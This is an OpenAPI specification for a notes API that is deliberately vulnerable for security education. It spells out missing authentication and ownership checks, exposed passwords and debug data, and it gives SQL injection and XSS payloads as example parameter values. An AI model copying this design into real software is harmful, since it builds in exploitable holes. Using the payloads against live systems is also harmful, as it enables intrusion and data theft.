# openapi.yaml
openapi: 3.0.3
info:
  title: Vulnerable Notes API
  description: |
    **⚠️ WARNING: This API is intentionally vulnerable for educational purposes!**
    
    This API demonstrates various security vulnerabilities commonly found in web applications:
    - SQL Injection
    - Cross-Site Scripting (XSS) 
    - Broken Authentication & Authorization
    - Sensitive Data Exposure
    - Security Misconfiguration
    - Insecure Direct Object References
    
    **DO NOT USE IN PRODUCTION!**
  version: 1.0.0
  contact:
    name: Security Education Project
    email: security@vulnerable-app.com
  license:
    name: MIT
    url: https://opensource.org/licenses/MIT
servers:
  - url: http://localhost:3000/api
    description: Development server (vulnerable)
  - url: https://vulnerable-notes.vercel.app/api
    description: Production server (also vulnerable!)
paths:
...
  /notes:
    get:
      summary: Search notes (no authentication required!)
      description: |
        **VULNERABILITIES:**
        - No authentication required
        - SQL injection in search parameter
        - Exposes all user data including passwords
        - No access control
      tags:
        - Notes
      parameters:
        - name: q
          in: query
          schema:
            type: string
          description: Search query (vulnerable to SQL injection)
          example: "' OR '1'='1"
        - name: userId
          in: query
          schema:
            type: string
          description: Filter by user ID (exposes direct object references)
        - name: limit
          in: query
          schema:
            type: integer
        - name: offset
          in: query
          schema:
            type: integer
      responses:
        '200':
          description: Notes retrieved
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/NotesResponse'

    post:
      summary: Create note (no authentication!)
      description: |
        **VULNERABILITIES:**
        - No authentication required
        - Users can create notes for other users
        - No input sanitization (XSS vulnerable)
        - No rate limiting
      tags:
        - Notes
      requestBody:
        required: true
        content:
          application/json:
            schema:
              type: object
              properties:
                title:
                  type: string
                  example: "<script>alert('XSS')</script>"
                content:
                  type: string
                  example: "This note contains <img src=x onerror=alert('XSS')>"
                ownerId:
                  type: string
                  description: "VULNERABLE: Can create notes for other users"
                isPublic:
                  type: boolean
              required:
                - title
                - content
                - ownerId
      responses:
        '201':
          description: Note created
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/NoteResponse'
  /notes/{id}:
    get:
      summary: Get note by ID (no authorization!)
      description: |
        **VULNERABILITIES:**
        - No authentication or authorization
        - SQL injection in ID parameter
        - Exposes owner's sensitive data
      tags:
        - Notes
      parameters:
        - name: id
          in: path
          required: true
          schema:
            type: string
          example: "1' OR '1'='1"
      responses:
        '200':
          description: Note retrieved
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/NoteResponse'

    put:
      summary: Update note (no ownership check!)
      description: |
        **VULNERABILITIES:**
        - No authentication
        - No ownership verification
        - Anyone can modify anyone's notes
      tags:
        - Notes
      parameters:
        - name: id
          in: path
          required: true
          schema:
            type: string
      requestBody:
        content:
          application/json:
            schema:
              $ref: '#/components/schemas/Note'
      responses:
        '200':
          description: Note updated
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/NoteResponse'

    delete:
      summary: Delete note (no ownership check!)
      description: |
        **VULNERABILITIES:**
        - No authentication
        - No ownership verification  
        - Anyone can delete anyone's notes
      tags:
        - Notes
      parameters:
        - name: id
          in: path
          required: true
          schema:
            type: string
      responses:
        '200':
          description: Note deleted
...
  /users/{id}:
    get:
      summary: Get user by ID (no authorization!)
      description: |
        **VULNERABILITIES:**
        - No authentication required
        - Exposes user's password
        - Exposes user's private notes
        - SQL injection in ID parameter
      tags:
        - Users
      parameters:
        - name: id
          in: path
          required: true
          schema:
            type: string
          example: "1' OR '1'='1"
      responses:
        '200':
          description: User data and private notes
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/UserDetailResponse'
...
components:
  schemas:
    User:
      type: object
      properties:
        id:
          type: string
        email:
          type: string
          format: email
        password:
          type: string
          description: "VULNERABLE: Password exposed in API responses!"
        role:
          type: string
          enum: [user, admin]
        isAdmin:
          type: boolean
        createdAt:
          type: string
          format: date-time
        updatedAt:
          type: string
          format: date-time
    Note:
      type: object
      properties:
        id:
          type: string
        title:
          type: string
          description: "Not sanitized - XSS vulnerable"
        content:
          type: string
          description: "Not sanitized - XSS vulnerable"
        ownerId:
          type: string
        isPublic:
          type: boolean
        createdAt:
          type: string
          format: date-time
        updatedAt:
          type: string
          format: date-time
        owner:
          $ref: '#/components/schemas/User'
    ApiResponse:
      type: object
      properties:
        success:
          type: boolean
        data:
          type: object
        error:
          type: string
        debug:
          type: object
          description: "VULNERABLE: Debug info exposed in production"
          properties:
            query:
              type: string
              description: "SQL queries exposed"
            params:
              type: object
              description: "Request parameters logged"
            stack:
              type: string
              description: "Stack traces exposed"
            timestamp:
              type: string
...
    NotesResponse:
      allOf:
        - $ref: '#/components/schemas/ApiResponse'
        - type: object
          properties:
            data:
              type: object
              properties:
                notes:
                  type: array
                  items:
                    $ref: '#/components/schemas/Note'
                count:
                  type: integer
    NoteResponse:
      allOf:
        - $ref: '#/components/schemas/ApiResponse'
        - type: object
          properties:
            data:
              type: object
              properties:
                note:
                  $ref: '#/components/schemas/Note'
...
    UserDetailResponse:
      allOf:
        - $ref: '#/components/schemas/ApiResponse'
        - type: object
          properties:
            data:
              type: object
              properties:
                user:
                  $ref: '#/components/schemas/User'
                notes:
                  type: array
                  items:
                    $ref: '#/components/schemas/Note'
                  description: "VULNERABLE: Private notes exposed"
                notesCount:
                  type: integer
...